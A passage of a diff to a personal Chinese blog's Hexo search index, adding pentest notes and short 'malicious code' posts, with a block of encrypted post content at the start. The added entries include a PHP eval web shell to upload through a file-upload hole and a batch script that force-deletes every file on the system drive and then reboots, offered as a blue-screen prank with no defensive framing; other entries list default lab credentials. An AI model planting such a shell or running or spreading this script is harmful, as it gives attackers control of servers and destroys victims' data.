1141f84c288dac0eba0cb6efc552f63fb6f9a3cb9ce34483e8687f1687347a9ab348e44417f019b61b04229ff807335608a459996f2195891fd648e5f444121f8152cac81a85c845445a932a6e39161cc795d8da76b56133c7364503f4fe9becf05622608a8de08d974ae2bda33b11e211b6752f06afc8d58983fecca96c8c7a4cd4cb53bace8f271e72ada392656b9dd16871c6bbe161b120d26edf3545c4afccd38f80825fff6af6246f9a18ccb758c74760ec6199c2abe705c0dd72a5177283bbdf49a16207697c6b6e3fd2bea7cf50131057fc7334b88f206ba34a1f1ab388e13227c5bc15b3b6e7c5e8b22c0687f0a8fa582211c641f520ef3847282022643237646c66df80cf21a20e9f6e5ebd8703aef2cc956d8ba515680cf7c07f486bd42dd8c6069d6deb63386e396bdaaced2940b1d9c45379b299725f05f7f3fdba621c48f47eeb89d4cfd23384c48a860624121c130160d8da2672d3a63351fe31452b9931cd819caf63b8fd0a8780ad41fdde86e8aea7380bdabe737aec063a7a841180f6a7d8f8842e85b9a87d721bd3aa70c4dd8a93440e5b9bac615f0ed3cf4cba54e6b062d223c1287599fa3608709699fcb0f8e3baec9fc2d4d8fa0c5b53e375bebd32bdc683f89fe8c6c0bd71a377b017116eff123cbbd31e94136e000aad2ea994b9242af3c86918f072fa7a52d5f90371a596255481ac0a5159ffa849c1922403b66571ac4653dea901b11255c63a0a029548f14a01d19de6a5cca48cc6e02282895f00f9d73bce105dab3ded592ef4fc3e4476923b07defde47a28a3a39eb6fd6c422fe9ea0e85d8879dbc98b446dea76908d983e5cf4a782616f89a3479898a0c8b20e3f0a6593ac483110d79bd60171c82e606cf3a8d7bd67845bfcf5884424d13f879ada2f056cb7ecc6471cb365f8fe84e3e5bd63fccae4f37d36b1abccd3976149a8f8fb1e576299853959aaa90e9b1c2d57b7708e8565b6d1f3671f0c2cba53a88acc833db75eaa539232739fa42fbad90d6be513150017852e2b7455f940ef7fa3c62890558a1a3b3b3cc3ed13ab31577656c1e9794603be2cedbbd3da1b78c35033d0ea64d92394c11bc04d68c5eff2381059327c3204b165cb2c7a039f20ab193bb65703f9f78ad561da17a7fce1c90a068f4168f7cafd7ea1cb8b0f0af62c484a759eb06d7a0831dd268a6f8e3e1dcdf7f7353b8fe75b15746eb0cb058fcd254200a9168d517c8030536d18fcc94f63c4e2191023c65ed6907023bf8e7a2263b8371197ff95428a87cb5750642b4ddd194f6564f342b53c9acd31077eeea589ec3f282c6755554759325f1f9e022c9580fa2b76b9f4cf1549eb98ae1e69dbae530e88c3c2f6886ed92552328518d4d7df7e40c68e179491f1d5cb118e81fd14fb61f79176e1c30a552b67f648b39b9bf8e646c12c80677018e5a5ee8f6676348a31d3aa76de7d4f063ad8ba385304633230f66b8792de3be3cd310523b9fe398b76cfeb717e2bde1f697f7a7fd3f27f8164d0ec41368d47c48f738cea68b7b3ec53133f9e0713c2dbd21237da02d77892a1aa6387d1ddeed09b13c3b08d68bc99569ac3e5afdcc563b4e38fc6bb0c3e50bf21e71accb6c756c52a5af9f7fa489ea80f3aa0c21c5c350189854e05a119cc28b325e13102f7be935deb86acb4b4e5673f6d4b144e05fdd9c2dc3405a0decea3d2883cecdc404e966850f27ffe26b4e5bf12c7ab3053d36ad46f6e8dcd06ef89d1dab94795343838817d3179be7cb03785faa7ae62a06f647839274c3517cc5a2e1f0251a72c8a0ff2bb8a89e542402f3b2d564d93b60ef7a8d41d7b0b2db924be1bba2cf57086689f2d51de7f31bc99a7adcded82ed708fe6203f12c104aae03998f62a07800a619752f5781f87c00f3144f9b153f6f2d4b1a2a3af280f23ae66fa626803304a1f898294f79b4d7c29618f6e76bc6a37e70e46e15084fad1729bf0be1bfa5efb679059e63856c59ae381483b8ea7ea6613287f382872fe101c3885d1ac829818b07d1138a29d2ba088a963bdab3d2668380f014f8a34cf14d1fd01cc4dc1b4706206cc5e9101c8cdb49f5150d190d4e51d57286a0b4b120c940ac1931fb3ce1e9a6255517bd861b496550bb5a6d490b6f7323b2f2189f1769549ae57da56712a3c4a2207c669f86ad2a2b5642d56407f9f3d5996e824d2b29eda604cec2a24fff2e71e207a8d2d0c4c7d205ddbf7ba0732974847c63a29f05e6ad4ac2dd03135ae0a3bbee16a91c82516bc5bc09d4bee46d94db7b151413841e5ba8ddac222750c2306ee79ed34d69d5b9f49ff616d47b4ec1b83ce783f842923edbe693d733f667fd03a01310be4634f0e3c47b258f40ca216229ce5ce9f7660d90f27c973e6337b81ef2c9dbf6a290cba1cac4b6c857fddd8c1ec0d373401df39376a2ec0c5335ca842b11b982774174a052e150f48c9b086877c629b328e436a351cb097d7121ab0a7d668630c39512b12ee2bb097d52a21edb2e59179c5719ff5ae7098d56a7c5b32160a206e32668434059003ec8480266cdad72c8c72f6bc150f4ab0947f95d56e24f962fa14b8a5a593b6f134ee28a3812e2ceb428b7c07d11d8c9ee2f5acc8d718e1eb85783541690703ba3811de4cecae8b0fd18a6d30e91001a9811f6466273832fece86c7519535b47292afb5c8f7087c</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="您好, 这里需要密码." /><label>您好, 这里需要密码.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="120765e1bcff86862752475069589e57d23176c797282c2f8109b1cf0718825b">2e0bf7f568d917ba47311008e416c184470878c7e8e68706f96d0e3513baf38041bc781ccf48d9ff6eae6811df7ea6aae571f5c8fb05835e76ac41b6703573adca54c96f1862d9c9d9adbbae37481ce39475cf2137986693edddf08d9737f0eb71e2ee154524813390a603ae44b60ba7be0ae9e1dc5fe9cf7d6fd2f11fbdb9db16cd36f2ab70d49b23b3c1f8350c825a7a17b233d2b09b8f492d1775a742b651b27ff75008f297188b101c16bb42d04cb5e3b8e984511eb635f3ba4249d5121d3491f436b8a7ed00d36962889323a229d4a1e55a7718d73fe7ac22dd41eadf497e5a75197fb062bc6b3efd07446c73d46f51aa3fc49896697ab34fab0684d30473dd9b8b93da4ab222c1668996437811a53ed96f9d8525832cfeec7657e8ba5dd4173979a97e90a1c085ead8cd691714192c79b3c006ad3736edccfd342fad38d89914e2e0a950cb50fe2c2ef2ed7315d5359a4de62e08a5d985d0415a07f1ec19cd45059143227e08cf7f6ae7938d8f6a1e17557826233cc0dab2e1b44f5e5e9b5593bcb450fda99ef0c745872776a1094ce44709a29ae74c193706b9f8673cd99ea65a27049c3010160ec56fced08c771d2545a5ee51da1629b851853399deec8a0e724e7e8b186d50a5b31033535661395c8d3056eaffb026af1794c7cd9c84f65d5eb9b0a0068f07dc4850354c3fe359d5b351ec551fc8beee10d17f618ea5a79f6edd80955c6ab0068739cebf5fea49ecc238f98087f00e2979b941e63a8effd9cafb9270de84b30d034165dfe78f769cc8fb37c139c57713ea77e9d17eb340b4d83567606ed76305213b25f30c79c79dea25208e84a105d6e225eeb980b6dd0423a5d83ce2527a7a285ec78d560d76ab2b9fd01b4a990be2ee5b54a0dd040c20d596a3dcaf9d3d254507a3f3bf8effc4db1ce00c1e280cf9c0a9a324405039dd47a9b71795dfc74c02d2c4af73e9f4c4892016b9800c86a6ee309d2e57c4178cc39b6c48fbbb3399daded435c4d2b9d07fe38844208d58a22365b8bfa830ffe7b7686c23b17251647ddad8380564a902285d6acafd65404b6e87090825a1183494cbaf6e4b35b2634fe01b1128877e2d78f9b65d2adb691d9a93cf376a8b7f12ad7c50a54d0514030c336ed499bb0f094df64057c5f3fed0d0945869ec23b6f282d01eef725420ef4e2557eea7d48a7b097d19c243d7fb8e2893356c81d3d04ec556256f113c2d7e5a5eb1be3cc63aa0e8e96d0438b6a32b567bf85b2cbf5e71853b76ae42cbdc3dbc0808f9cb0aeb3310147f549023b79d00cafdceb89af0a3a74d16f4073d3a4b8a364fc54c5234adbf9b220cd5fd1f13d94fde80977606a6e5e42f9edd5d3926f61bada06eb0a17c09053dc33e80ec94d5181716f7d96617dc068a0c31ee49d17e7c0fa51bfff01ce575dd3d9fd655efae60a452aa32155fdd8463e0321e595a925bffd36fb52328d0027b0b06c8e8aad441bb68a75dbdb82e74ac7278837d40216f131921a33069e33c9456d7cb236f97e10265a20a67dab38f5df8b172a662a853bcb47d2fdd0bf4dd145117cbf19ab135dd217f0d9d94ef1be4a7a3b276fbab814fc7004c891ab1da4182a942a6a50e4efcf681d357a4d2ac4da46998dff2ae6bc48c1d8b209e4a57e3492f02ffe4e0ee43880c5bfa7afd6cc3a9b94ffe179dbba66576d739c6d931d7b391f98cf34afa446b25d2dffeefc9f5a8d256d28eff8ce246fba5006e969242967a5f789c8efcfa0d3f7a2103d4dcebce52ca28c2eb1982f258c409b52aa2e6886bf767d3f9e23b07990094617d75f1776dae05cee2499907acd8e559fbb5cb72aeb5d25b154dc8226b600344f86383c4d351c72f6a5e6f56efdb6d2a956ba62bb88066aaa06754d467c8e019e48272334145637e13f04f221d44f0acc2ee7ef99f34529acd355af9cb4abe942f4f9437796e5be95c63b31f8661a7acbcc743b0474cae8fb6cfacb4b22d59515fd106c4c118198d484dde91c72a993bb70855941883d313c8706d44efe9de073f7d8c7b0a4f1501e0e24ed35593efb070cd34da2d0457e511d0bd749d0a869636686453926690d8e5d7dc3466706c94950762987503d51c7f090480d8d80024b57bf0d7249f2b71d335a0d565ff1d8ad60418201fb8b28d903ee199727df9e8156251b23287d32064c83d08a78b3f21146ff45ce22b51f37232f68382b225b97950a5a3104fc299165b060a8fde9a9f608bcdff851713cf36a2b841c8d664addc78c662c72fe4259da00de22510d744774250dd22a9823993884d34128c52c27e646e8d413d624ff0b96e6419e028a44b2f8c0c52cce8d73668f215d5c1cf71e49c5907a97b054e0c47c6014a26c33a48537a472206c8af34c4b1b924f3c813cd1858cd19b52f54564ebbbf09132802521efe2c757e996fccb02d1249cce7d29d0c2c957189925da82d5796def5dfc41b387e81863cdaa3fe3b8faa948419742f785677f72fa543289a1d9eb8dc364a20b924d5a099185b4bfcf2a912b00285d311746fb2741ad7499f570b1d79a667e104e448c00d271305fc452a3344caae5fb677a644e075b9a3c5fd1bbf86fb0be6657f1f8cde1d62fc6933b967664b684d8feda277557eac743764cc3d1bd92d57cc3caecbfddf3e64f3c04d8355345a01cfd13b2bd8fb2b653c3a494d5aa5e18e99c16785144b3ab961068664c74be24cbaf9a1d2e4410a8e261be252633544f80c5f30c02f2c78a4baa7aa7e06328aead9cb088eba6691c937c8ff672c588627dba2b4f75ed157677eabdf35195e50fe97f8f7152ab32bffde92f89358439d1549a8a5edb3b1b8b0510fd0c92353ab7abee76e42153ea8aef61f57438ab2769c30d7074f746bc9b92b836860ec43c8372de6cc400679b430ae65c1ea578dc2f6863a6c9bd5d7548b333fcd33737b1e751929b4f2014a305df7daadae1b3a16055ce2176295b085f1d8ece62f3ba5a05ae85da4d63856c30c6f5dbc6e5d447145cac6d14c7f8d827856dbfa1dda45c2339ae75fafa5bc14ec3007c493f7d2a1bd6598620a8da1459df072c7b131d41976e5d2eeab314ad68ecd9b3a43d7c8d7e6251c444321b62c346513adef8db61640e3b847d6de5b39db7898e9042cbf576a4da05a67b021bb5243500772604cdb43cf655e70491d74a4ad45bb243aa56ae2b6068c45a03556b4763af73edf3fc8491849df949415b2d3f370e35d845d147571c3a06769e2954ea88b639b6ff7c97a0fbeb15f3b7587ea64210c2810974249f1e6a69a5572b3c6065bfc390be96a683d841b13c01cc24da15136b8011bb317deb6e3323ab3f6c70127436f75ca58edf5559012abe138e8e9b7a93e3d3d37365875ed1503fb099ac3d113ae052876995bd2c40efaef5a887556dd5761635a8c6b5854b4cc0f8c898c8f064066eba1d3070bbb1984faa4a45458a340fa8121d1339222d30f59ac1d041ff845f6f08d7a35f982eaa91d8ac5b566204d1e846cbff8b2556e1795fc989a1f01e2079d57c8ce33fef6ec15ff70e8f6a94d460ab63d87af20e53d4d63e362499661fc32bcd783339b341e3a18b30d82f15fb660db1856be7401b98746894f496d48785ae3e653a902ca82fb49bb5429cfa9b0bb43c43dacaac8faeaf339c8596df66ff404612a0ae0ff1de526bd3f9e37100ba629f96d9e4d1342cab02e3fe168525dfdbbfa916f04f444ffe5a191dfd4d4aa0784424a227f762de7ab07313c74876f24aa133eb84ebc14ba51cc5a75a5f98517c36f1333bb55d554d4a181039805e81fe6b307956c2a5135ea84806b0536fea395dbd37c72a9fdd3e6678ceb305a973c6ed978ef17ffc462264ffd01c0146b82f6b616236a54fa10a8b8de463e557fbae1ba09699a19537b9679a8554f093a83d5de0d532d2b954efdc91e05a3b63aaa01dd03fd13011763bb346b96ca5becaddfe804e967494f4643bcf627e38dafd76ee565254a06c3a2164592ad8a0d0567fc0f924292e15a090e085e78a633d5bfb580f078212dd17b7e1c7bbd2aba4305874254ed23a5c4d9d019e37d41aae4e91dccb496543eaae5a8cf16227d16c0d8f0c01fb797c62fcb504f04490847b8cbabfc2d00032a53a242ed0b950f4a5f280fb530960b338be6938480e66fc20e20751de9eabee38b41d80365e91f2de7a02c2d57f20ec18bf0d2e04a24a3a7121dee70c44980c0f6c2061d6d809354156182c179bdfbd2205e0dc8cc4190bacacf39d835277b83a5b2e095835be9d46d6bcab94e23cb902dc3cf8af7e1be1d9e7546e31084d7a4aea0273a48f0dc8fd99770e6db3e6c4fb26af401faca5968c6c05964fe4e5af02fc943f7d6b30837a9b4c203c842003003b5f30e98f1eac7b2583f1feeb7058ea9f2da12ba1c6f2a1f1b8037cbfdba6dbec494f4a1486b9e24d89374d6bcec5906454c6fde95e774a0ecff6d931a648c737152c6080f4fc64bdeba157934d2f0646851518134014c6446bce622bbe202332b9dcc73b14b437c144bc3bf36823832617b9a22a1a68db59f212fd9184e805f018425145ff334fb6a158bc458477898e30205cf94d58a65315645a92504d1af6ea4944350672868bce4566b92b8c06bdc5eb6bd91274e8a6c0ae812ba8afa4bced26a66d4e8c5c720a343c16d2284790bda155abe2ef5ed9425707205ee25b5080b641fe315dc033164f8db285733b223d54544582642602d50efddb9fcb10a58b9ca218c38297c359d92b53bd8cee0ae067db3db5d790d4826e67306eb9786baa47a276e4f3f36b82b01c3874754d39789c736e24e55de3ac7a925572710fbfcdf3c8e00dac81c00ae12fdb0f526c21fdaa466ca9b3fec1aec492eacdc18c73fb17e46e3c351110b40e4cc1c8572a777352e5471e420ebde972d17a9ff2c005873261d0256ba7eb484e18f184b847b4ce229ca1f369d40e0a788095f073944dece16314a86b7fa9cd3209f5da583e73dfd6b18617a6e1d51622b5eb786c6a1821adae33dcbdc3388ea460b30487af67bb1604261cbb7904c11ba08d9e318d28952cff5467400c9f9f7454d27e4fd72e3345966307eeb52bbc50187e8f84b4c03f46874fea2c31e8813ff6a5e5b03ca9934a94d9934680b2e6994f034148325e52e8f4da31bb9edef5498b74fbd76abd2af73a09cecfd80ef735aa5518e2923dee54eebf2a6992627978d313781ef734f15cec4bd2c6f79ba397294bbcbd223a24bd30afa560ce4da0eb120b74eb57b1df8523c92ee6a7df9c330a04ff86e339f05579f0cbcdcc842403410654448b8f1a37fdbc17327d64928cd45b61b15a034d6fa050313482f6601c282d3171366d066702347e09f531ce234f5788f3539889bf16835345f23e14b085319aa2129d472c610a53caf408c015e5cf8dafdc512a9d27e2402879461ce03e4102ed867427449d4712bec333602ed982c72f7a820b806e889a891a371a2ed99b0c1ac494003dc0c9d8db6968f5d593a0edc591847378bf1ebd2c5884d43b0d3b8880554c88854ec1d07ff7f8c938806dc3276cf84fdd65d388edca267502fd5ecab17bee0c8ec6304ff7db2839df38094ee97373a94e7d6319ee515080e4b33eaef288e2cd1f0f1c62d36d928b77c19a213d2f2fd6dfebf1926b93a7fd671be6df383ffb8a4ae4868a1b6c87a46bf6dbea193adb9a3079845f5ced1b4681b36d1fb2f25941890c6ac769784d033f20336d2ca090977d13cbfb71eea14e8fa940d3de7242c2143856bbe65282c90c4023ef9a64a60913cd4836fa65d1b5b09d896461a4bf0955b690edd334624449c0c34c8ce52e26aef026efea623f77db4b0850d817ab21de4834bb702de453fd4429889a563a15a5f585dd8ccbe6a0a1b5d5def1293a148bb641471ad7048e5eb529eb2bd8d67727f04c4f98b27cf9e0ab42b2b657da032d55fe4eb14095635c4d9ad01951485d3fc56f81d6a78064be873b2c8219019815f66b4b0d6ce28f67c9626102527f07edea074d22e763bb7edf70d512e3400ed90c64964b3d16919e70caa8c35f01ed71d8744c8b4316ed8e985824477325c76dd6d74615d759387cc2cdb9b57e2f023dae668c09d9bc17ac00b542b87955e4e9b0d69ac8ba141447b721f88875f93bd4bc18341977ec8bad9c6c0f82726521751e84e1869ab23c3a8e9354264ebb13216c01d241b2811bd7c0cac80d74b6f286990ff3d191da6d16dab8f5222eb7c0b1517711a6f58344b90421d9a79b9aad4ce740463c9fa80663a6624cbe6d6a58eea280304db03ddb74de1178236a434541a0cc8201f01e80a9102ecc9b44aff34ee0eb1696cd50d042531bd12c7e4b15f849daec0abbde44c1fa7b4b6a3036ffb54c66a2bf7be31bbc369677a84ea8de7166d28a23644351c1aea70fb51cbf5ffacc37538f399a646d0885264141de8532d4563fe88833b20f4c31b92399a99ad67c0cda56c1b3bf481a67dbbe3d51baa6682589ed8aaf20280af71c81c971e0e7332319caf69e48649791e328a601b424f4a114fc25c4108fe4d9a22644bcf03c1a4b796d5b6357e9b4bd5dcdf1c131f7a945c0d46</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
         <category>Penetration Tests</category>
       </categories>
@@ -18510,6 +18520,7 @@
     <title>【笔记】安装 Commando VM</title>
     <url>/2020/01/09/%E5%AE%89%E8%A3%85CommandoVM/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Commando VM使用Boxstarter，Chocolatey和MyGet软件包来安装软件，并提供许多工具和实用程序来支持渗透测试。Commando VM拥有170多种工具，并且在不断发展壮大，其目标是成为每个渗透测试人员和红军人员事实上的Windows计算机。（<a href="https://www.fireeye.com/blog/threat-research/2019/08/commando-vm-customization-containers-kali.html" target="_blank" rel="noopener">官网</a>）</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
@@ -19141,6 +19152,7 @@
     <title>【笔记】安装配置 Metasploit Framework</title>
     <url>/2019/11/16/%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMetasploit-Framework/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。<a href="https://wikipedia.hk.wjbk.site/zh-cn/Metasploit" target="_blank" rel="noopener">维基百科</a></p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="下载安装-Metasploit-Framework"><a href="#下载安装-Metasploit-Framework" class="headerlink" title="下载安装 Metasploit Framework"></a>下载安装 Metasploit Framework</h2><ul>
@@ -20739,6 +20751,7 @@
     <title>【笔记】攻击具有 永恒之蓝 漏洞的Windows</title>
     <url>/2019/11/16/%E6%94%BB%E5%87%BB%E5%85%B7%E6%9C%89-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-%E6%BC%8F%E6%B4%9E%E7%9A%84Windows/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>永恒之蓝（英语：EternalBlue）是美国国家安全局开发的漏洞利用程序，于2017年4月14日被黑客组织影子掮客泄漏。该工具利用445/TCP端口的档案分享协议的漏洞进行散播。<a href="https://wikipedia.hk.wjbk.site/zh-hans/永恒之蓝" target="_blank" rel="noopener">维基百科</a></p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p><font color="#FF0000">本文章仅用于网络安全渗透测试学习，请勿用于其他用途</font></p>
@@ -22056,7 +22069,7 @@
 <h2 id="查看指定端口占用情况"><a href="#查看指定端口占用情况" class="headerlink" title="查看指定端口占用情况"></a>查看指定端口占用情况</h2><blockquote>
 <p><code>&lt;port&gt;</code>：端口号</p>
 </blockquote>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lsof -i:&lt;port&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lsof -i :&lt;port&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.cnblogs.com/ayseeing/p/4097686.html" target="_blank" rel="noopener">博客园——破男孩</a></p>
 ]]></content>
@@ -24893,6 +24906,7 @@
     <title>【笔记】通过XSS拿到网站cookie</title>
     <url>/2020/03/27/%E9%80%9A%E8%BF%87XSS%E6%8B%BF%E5%88%B0%E7%BD%91%E7%AB%99cookie/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过XSS拿到网站cookie实现无密码登录</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
 <a id="more"></a>
 
 <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
@@ -26515,6 +26529,233 @@
 <h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
       <categories>
         <category>LeetCode</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【笔记】中国菜刀学习笔记</title>
+    <url>/2020/10/16/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>中国菜刀学习笔记</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
+<a id="more"></a>
+
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
+<li><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">中国菜刀Cknife——GitHub开源地址</a></li>
+<li><a href="https://www.ms509.com" target="_blank" rel="noopener">中国菜刀Cknife——作者博客</a></li>
+</ul>
+<h2 id="文件上传漏洞利用"><a href="#文件上传漏洞利用" class="headerlink" title="文件上传漏洞利用"></a>文件上传漏洞利用</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><ul>
+<li>在网络上，对于php网站，文件上传位置，有可能允许上传任意格式文件，所以可以上传包含木马的文件，利用文件上传漏洞</li>
+</ul>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
+<li>在<a href="/2020/10/12/OWASPBWAP学习笔记/">owaspbwa</a>上的<code>Damn Vulnerable Web Application</code>进行测试</li>
+</ul>
+<blockquote>
+<p><code>用户名</code>：admin<br><code>密码</code>：admin</p>
+</blockquote>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul>
+<li>创建一个<code>.php</code>脚本作为上传的文件，并上传</li>
+</ul>
+<blockquote>
+<p><code>pass</code>：密码</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]):<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>在中国菜刀上右键<code>添加</code></p>
+</li>
+<li><p><code>地址</code>填写为：<code>http://网络上的文件存储路径/脚本名.php</code></p>
+</li>
+<li><p>后面的对话框填写刚刚指定的密码</p>
+</li>
+<li><p>右键创建好的shell，进行渗透操作</p>
+</li>
+</ul>
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
+      <categories>
+        <category>Penetration Tests</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【笔记】OWASP BWAP 学习笔记</title>
+    <url>/2020/10/12/OWASPBWAP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Open Web Application Security Project (OWASP) Broken Web Applications Project, a collection of vulnerable web applications that is distributed on a Virtual Machine in VMware format compatible with their no-cost and commercial VMware products.（<a href="https://sourceforge.net/projects/owaspbwa/" target="_blank" rel="noopener">软件托管网站的介绍</a>）</p>
+<p><font color="red">本文仅用于网络信息防御学习</font></p>
+<a id="more"></a>
+
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>开放式Web应用程序安全项目（OWASP）是一个在线社区，在Web应用安全领域提供免费的文章，方法，文档，工具和技术。（<a href="https://zh.wikipedia.org/wiki/OWASP" target="_blank" rel="noopener">维基百科</a>）</p>
+<h2 id="官网地址"><a href="#官网地址" class="headerlink" title="官网地址"></a>官网地址</h2><p><a href="https://owasp.org" target="_blank" rel="noopener">官方网站</a><br><a href="http://www.owasp.org.cn/" target="_blank" rel="noopener">中国官方网站</a></p>
+<h2 id="虚拟机下载地址"><a href="#虚拟机下载地址" class="headerlink" title="虚拟机下载地址"></a>虚拟机下载地址</h2><p><a href="https://sourceforge.net/projects/owaspbwa/files/" target="_blank" rel="noopener">https://sourceforge.net/projects/owaspbwa/files/</a></p>
+<h2 id="远程登陆"><a href="#远程登陆" class="headerlink" title="远程登陆"></a>远程登陆</h2><ul>
+<li>默认开放ssh远程登陆</li>
+</ul>
+<blockquote>
+<p><code>ip</code>：主机ip地址</p>
+</blockquote>
+<blockquote>
+<p><code>用户名</code>:root<br><code>密码</code>：owaspbwa</p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh root@ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h2><ul>
+<li>默认开放phpmyadmin用户数据库管理</li>
+</ul>
+<blockquote>
+<p><code>用户名</code>:root<br><code>密码</code>：owaspbwa</p>
+</blockquote>
+<ul>
+<li>访问<code>http://ip/phpmyadmin</code></li>
+</ul>
+<h2 id="主页"><a href="#主页" class="headerlink" title="主页"></a>主页</h2><ul>
+<li>直接使用该主机的ip地址进行主页访问，通过访问主页进行渗透测试</li>
+</ul>
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/weixin_43583637/article/details/94627052" target="_blank" rel="noopener">CSDN——冠霖L</a></p>
+]]></content>
+      <categories>
+        <category>Penetration Tests</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SpringAOP学习笔记</title>
+    <url>/2020/10/17/SpringAOP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+  </entry>
+  <entry>
+    <title>【恶意代码】蓝屏死机</title>
+    <url>/2020/10/18/%E8%93%9D%E5%B1%8F%E6%AD%BB%E6%9C%BA/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>蓝屏死机恶意代码</p>
+<a id="more"></a>
+
+<h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">del %systemdrive%\*.* /f /s /q</span><br><span class="line">shutdown -r -f -t 00</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.bilibili.com/video/BV1Z44113733" target="_blank" rel="noopener">哔哩哔哩——Aaa2呀</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>【恶意代码】使PC永久崩溃</title>
+    <url>/2020/10/18/%E4%BD%BFPC%E6%B0%B8%E4%B9%85%E5%B4%A9%E6%BA%83/</url>
